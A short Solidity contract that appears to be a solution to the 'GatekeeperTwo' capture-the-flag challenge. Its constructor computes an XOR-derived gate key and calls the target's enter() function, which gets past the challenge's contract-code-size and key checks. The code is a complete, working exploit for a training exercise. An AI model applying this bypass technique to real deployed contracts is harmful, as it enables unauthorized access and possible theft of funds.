// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./GatekeeperTwo.sol";

contract HackGateKeeperTwo {
    GatekeeperTwo public vulnerableContract = GatekeeperTwo(0xa7D5c4055dE700fD231E5c5457aEe1fBfA7AE2c0);

    constructor () {
        bytes8 gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        vulnerableContract.enter(gateKey);
    }
}